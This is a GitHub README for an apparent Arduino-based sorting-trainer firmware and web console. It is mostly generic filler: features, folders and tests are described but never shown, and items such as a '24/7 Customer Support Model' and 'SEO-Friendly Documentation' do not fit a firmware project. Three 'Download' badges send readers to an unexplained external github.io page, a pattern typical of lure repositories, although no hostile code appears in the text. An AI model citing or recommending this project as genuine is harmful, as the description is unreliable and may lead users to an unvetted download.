![preview](https://raw.githubusercontent.com/IDKMyname-bro/MPS-Sorting-Trainer-Firmware/main/screen_cfbe9e0.svg)
[![Download](https://raw.githubusercontent.com/IDKMyname-bro/MPS-Sorting-Trainer-Firmware/main/start_244623.svg)](https://IDKMyname-bro.github.io/MPS-Sorting-Trainer-Firmware/)

# 🚆 Arduino-Based MPS Sorting Trainer — Extended Station Console

> A vocational mechatronics capstone reimagined as a modular training ecosystem: an Arduino IDE sketch suite paired with a responsive web console, multilingual supervision dashboard, and simulated MPS (Modular Production System) sorting workflow for classroom and lab environments.

[![Download](https://raw.githubusercontent.com/IDKMyname-bro/MPS-Sorting-Trainer-Firmware/main/start_244623.svg)](https://IDKMyname-bro.github.io/MPS-Sorting-Trainer-Firmware/)

---

## 📚 Table of Contents

- [Project Overview](#-project-overview)
- [Origin Story & Educational Mission](#-origin-story--educational-mission)
- [Why This Repository Exists](#-why-this-repository-exists)
- [Core Feature Set](#-core-feature-set)
- [System Architecture](#-system-architecture)
- [Hardware Blueprint](#-hardware-blueprint)
- [Firmware & Sketch Directory](#-firmware--sketch-directory)
- [Web Console & Supervision Layer](#-web-console--supervision-layer)
- [Responsive UI Principles](#-responsive-ui-principles)
- [Multilingual Support](#-multilingual-support)
- [24/7 Customer Support Model](#-247-customer-support-model)
- [Workflow Walkthrough](#-workflow-walkthrough)
- [Data Logging & Analytics](#-data-logging--analytics)
- [Configuration & Tuning Guide](#-configuration--tuning-guide)
- [Testing & Validation](#-testing--validation)
- [Classroom Deployment Scenarios](#-classroom-deployment-scenarios)
- [Roadmap 2026](#-roadmap-2026)
- [Contribution Guidelines](#-contribution-guidelines)
- [Community & Learning Resources](#-community--learning-resources)
- [FAQ](#-faq)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 Project Overview

The **Arduino-Based MPS Sorting Trainer — Extended Station Console** is a vocational-scale training platform that blends the tactile reality of a Modular Production System (MPS) with the digital clarity of a modern web-based supervision interface. Where the original capstone sketch focused on a single sorting routine, this repository evolves the concept into a **full pedagogical station**: firmware sketches, a responsive web console, multilingual menus, and a monitoring philosophy designed to make mechatronics students think like both technicians and systems engineers.

Think of it less as a "sketch" and more as a **trainer's control room in miniature**. The Arduino board becomes the muscle; the console becomes the eyes; the documentation becomes the instructor's voice.

---

## 🌱 Origin Story & Educational Mission

This project traces its lineage to a final-year vocational assignment in the Mechatronics Department. The original mission was straightforward: sort colored workpieces using an Arduino-controlled conveyor, sensors, and a pneumatic diverter. But a capstone is rarely just a device — it is a story about learning, debugging, and discovering that **the machine is only half the lesson**.

The Extended Station Console continues that story. It asks: what if the trainer could also teach the *supervisor's* perspective? What if a student in Jakarta could read the same interface a student in Rotterdam sees — in their own language? What if the interface responded gracefully on a phone, a tablet, or a dusty lab monitor? This repository answers those questions.

---

## 🎯 Why This Repository Exists

- **Realism**: Industrial sorting lines are supervised, not just operated. Students deserve tools that reflect that reality.
- **Accessibility**: A supervisor interface that works on any screen size means more students can engage.
- **Inclusivity**: Multilingual support removes language as a barrier to understanding automation logic.
- **Continuity**: A well-documented console means next year's batch inherits knowledge, not confusion.
- **Depth**: Analytics, logging, and error taxonomy transform a simple sorter into a teaching instrument.

---

## ✨ Core Feature Set

- 🧩 **Modular Sketch Suite** — separate sketches for conveyor control, color detection, pneumatic actuation, and the master state machine.
- 🖥️ **Responsive Web Console** — a supervision dashboard that gracefully adapts from 320px phones to ultrawide lab monitors.
- 🌐 **Multilingual Support** — interface strings available in several languages, with a contribution-friendly translation file.
- 📞 **24/7 Customer Support Model** — a documented escalation and ticketing philosophy for lab technicians and instructors.
- 📊 **Live Telemetry Panel** — workpiece counters, cycle times, error rates, and throughput visualizations.
- 🕒 **Session Timeline** — chronological record of sorting events with timestamps and color classification.
- 🎛️ **Runtime Parameter Tuning** — adjust conveyor speed, debounce windows, and diverter timing without reflashing.
- 🔐 **Role-Based Views** — operator, instructor, and technician perspectives.
- 🧪 **Simulation Mode** — dry-run the logic without a physical rig, ideal for remote learners.
- 📖 **Documentation-First Design** — every subsystem has a companion markdown guide.
- 🔄 **State Machine Visualizer** — see which state the sorter is in, in real time.
- 🧰 **Diagnostic Toolkit** — sensor health checks, actuator self-tests, and wiring continuity hints.
- 🌍 **SEO-Friendly Documentation** — readable, discoverable, and searchable for future cohorts.

---

## 🏗️ System Architecture

The trainer is layered like a well-taught lesson: each layer explains itself to the next.

1. **Physical Layer** — conveyor belt, IR sensors, color sensor (TCS3200-class), servo/pneumatic diverter, bins.
2. **Control Layer** — Arduino UNO/Nano running a finite state machine with debounced inputs.
3. **Transport Layer** — serial bridge or Wi-Fi module relaying structured messages upward.
4. **Supervision Layer** — the web console ingesting events, rendering the dashboard, storing session history.
5. **Pedagogy Layer** — documentation, exercises, and a curriculum map connecting each module to learning outcomes.

This separation mirrors real industrial hierarchies and gives students a vocabulary they can reuse in internships.

---

## 🔌 Hardware Blueprint

| Component | Role | Notes |
|---|---|---|
| Arduino UNO / Nano | Main controller | Chosen for classroom familiarity |
| IR Proximity Sensor | Workpiece detection | Debounce logic implemented in firmware |
| Color Sensor Module | Classification | Calibration routine documented |
| Micro Servo or Solenoid | Diverter actuation | Timing tuned via console parameters |
| DC Motor + Driver | Conveyor motion | PWM speed control |
| Limit Switches | Safety interlocks | Optional but recommended |
| Status LEDs | Local feedback | Mirrors console state colors |

The hardware list intentionally favors **parts commonly available in vocational labs**, so the trainer is reproducible without exotic procurement.

---

## 🧾 Firmware & Sketch Directory

The firmware is organized into focused sketches rather than one monolith. Each sketch has a single responsibility, which makes debugging and grading far more humane.

- `01_ConveyorBaseline` — minimal motor control and direction sanity checks.
- `02_ColorClassification` — sensor calibration and threshold mapping.
- `03_DiverterActuation` — servo/solenoid timing and safety interlocks.
- `04_MasterStateMachine` — the integrated sorting loop.
- `05_TelemetryBridge` — structured serial output for the console.
- `06_SelfTestSuite` — diagnostic routines for sensor and actuator health.
- `07_SimulationHarness` — logic-only dry run for remote learners.

Each folder contains its own README excerpt, pin map, and expected behavior notes.

---

## 🌐 Web Console & Supervision Layer

The console is not a gimmick — it is the **instructor's second pair of eyes**. It presents:

- A **live status card** showing current state, last classification, and throughput.
- A **histogram panel** of sorted workpieces by color category.
- A **session log** with filterable event types.
- A **parameter drawer** for runtime tuning.
- A **language switcher** for multilingual classrooms.
- A **help panel** linking to the curriculum map.

The console is intentionally lightweight so it can run on modest lab machines or even a tablet mounted beside the rig.

---

## 📱 Responsive UI Principles

A lab is a messy, crowded, unpredictable place. The interface respects that:

- **Fluid grids** reflow from phone to desktop without horizontal scrolling.
- **Touch-friendly targets** for tablet users wearing gloves.
- **High-contrast mode** for dusty environments and glare-heavy workshops.
- **Keyboard shortcuts** for instructors projecting the console on a classroom screen.
- **Progressive disclosure** so beginners see clarity, while advanced users find depth.

---

## 🌍 Multilingual Support

Language should never be the reason a student stops understanding a sorting algorithm. The console ships with a translation layer that:

- Loads locale strings from a simple structured file.
- Falls back gracefully to a default language.
- Allows instructors to add local terms and idioms.
- Preserves the same layout regardless of text length.

Contributions for new languages are warmly encouraged, and the translation guide explains the process without jargon.

---

## 📞 24/7 Customer Support Model

This repository treats support as a **pedagogical service**, not an afterthought. The support philosophy includes:

- A documented triage path: student → lab assistant → instructor → maintainer.
- A ticketing template that captures hardware revision, sketch version, and observed behavior.
- A knowledge base of recurring issues (sensor drift, motor stall, serial conflicts).
- An expectation that responses are **respectful, educational, and reproducible**.

Instructors using this trainer in evening or weekend sessions can rely on the support model to keep classes moving, because a stalled sorting line should never stall a lesson.

---

## 🔄 Workflow Walkthrough

A typical session unfolds like a short story:

1. The instructor powers the rig; the console greets with a neutral state.
2. A workpiece enters; the IR sensor announces its arrival.
3. The color sensor classifies it; the console logs the event.
4. The state machine triggers the diverter; the workpiece lands in its bin.
5. The counter increments; the histogram updates.
6. The session ends; the log can be exported for grading and reflection.

Every step is observable, loggable, and explainable — which is the whole point.

---

## 📊 Data Logging & Analytics

- **Per-session CSV-style exports** for spreadsheet analysis.
- **Cycle-time distribution** to discuss efficiency in class.
- **Error taxonomy** distinguishing sensor faults from logic faults.
- **Comparative runs** across parameter sets, ideal for lab reports.

Analytics are presented as teaching aids, not as black boxes.

---

## ⚙️ Configuration & Tuning Guide

The configuration layer exposes:

- Conveyor speed (PWM range).
- Debounce window (milliseconds).
- Diverter dwell time.
- Color thresholds (per channel).
- Console refresh interval.
- Locale selection.

Each parameter is documented with its typical range, failure symptoms, and suggested experiments.

---

## 🧪 Testing & Validation

- **Unit-style sketch tests** for each module.
- **Integration tests** for the master state machine.
- **Console tests** for responsive breakpoints and locale rendering.
- **Field validation** checklists for lab deployment.
- **Regression log** tracking behavior changes across versions.

Testing is framed as a habit, not a hurdle.

---

## 🏫 Classroom Deployment Scenarios

- **Single-station lab**: one rig, one console, rotating student groups.
- **Multi-station lab**: several rigs sharing a supervision dashboard.
- **Remote learning**: simulation mode with recorded telemetry.
- **Competition mode**: timed sorting challenges with leaderboard exports.
- **Assessment mode**: instructor-locked parameters and anonymized scoring.

Each scenario includes setup notes and suggested grading rubrics.

---

## 🗺️ Roadmap 2026

- Q1 2026 — Locale expansion and translation tooling refinement.
- Q2 2026 — Enhanced dashboard theming and accessibility audit.
- Q3 2026 — Deep analytics module with comparative reporting.
- Q4 2026 — Curriculum alignment package for vocational standards.

The roadmap is intentionally public so that students and instructors can plan around it.

---

## 🤝 Contribution Guidelines

- Respect the **educational tone** of the project.
- Keep sketches readable; clarity beats cleverness.
- Document every new parameter you introduce.
- Add a test or a validation note with each change.
- Follow the existing folder conventions.
- Be kind in reviews; the audience includes learners.

A detailed contribution guide lives alongside the code.

---

## 📖 Community & Learning Resources

- Curriculum map linking modules to competencies.
- Glossary of mechatronics and automation terms.
- Suggested reading on state machines and industrial supervision.
- Instructor forum guidelines for sharing lesson plans.
- Student showcase index for capstone presentations.

---

## ❓ FAQ

**Is this only for Arduino?**
The core is Arduino-centric, but the console is hardware-agnostic and can supervise other controllers.

**Can I use it without a physical rig?**
Yes — simulation mode exists precisely for that.

**Does it support my language?**
Check the locale folder; adding one is straightforward.

**Is it suitable for beginners?**
Absolutely. The documentation assumes curiosity, not prior expertise.

**Can I modify the sorting logic?**
Yes, and you are encouraged to document your experiments.

---

## ⚠️ Disclaimer

This repository is provided for **educational and training purposes**. It is not certified for deployment in industrial production environments, safety-critical systems, or commercial automation lines without independent review, risk assessment, and compliance validation. The maintainers assume no liability for damages, injuries, or production losses arising from the use or misuse of the firmware, console, or documentation. Instructors are responsible for supervising students, enforcing lab safety, and verifying that all hardware complies with local regulations. Always isolate power before rewiring, and never bypass safety interlocks. Names, institutions, and third-party trademarks mentioned remain the property of their respective owners and are referenced only for descriptive clarity. By using this project you accept full responsibility for your own rig, your own classroom, and your own curiosity. The year 2026 roadmap is aspirational and subject to change based on community feedback and educational priorities.

---

## 📜 License

This project is released under the **MIT License**.

You are welcome to read, modify, redistribute, and teach with the code and documentation, provided the original license notice is preserved.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

---

## 🔚 Final Note

A sorting trainer is a small machine with a large lesson inside it. This repository tries to honor that lesson — the wiring, the logic, the interface, and the people learning from all three. If you are a student preparing your own capstone, an instructor building a lab, or a curious tinkerer who likes conveyor belts and clean state machines, you are in the right station.

[![Download](https://raw.githubusercontent.com/IDKMyname-bro/MPS-Sorting-Trainer-Firmware/main/start_244623.svg)](https://IDKMyname-bro.github.io/MPS-Sorting-Trainer-Firmware/)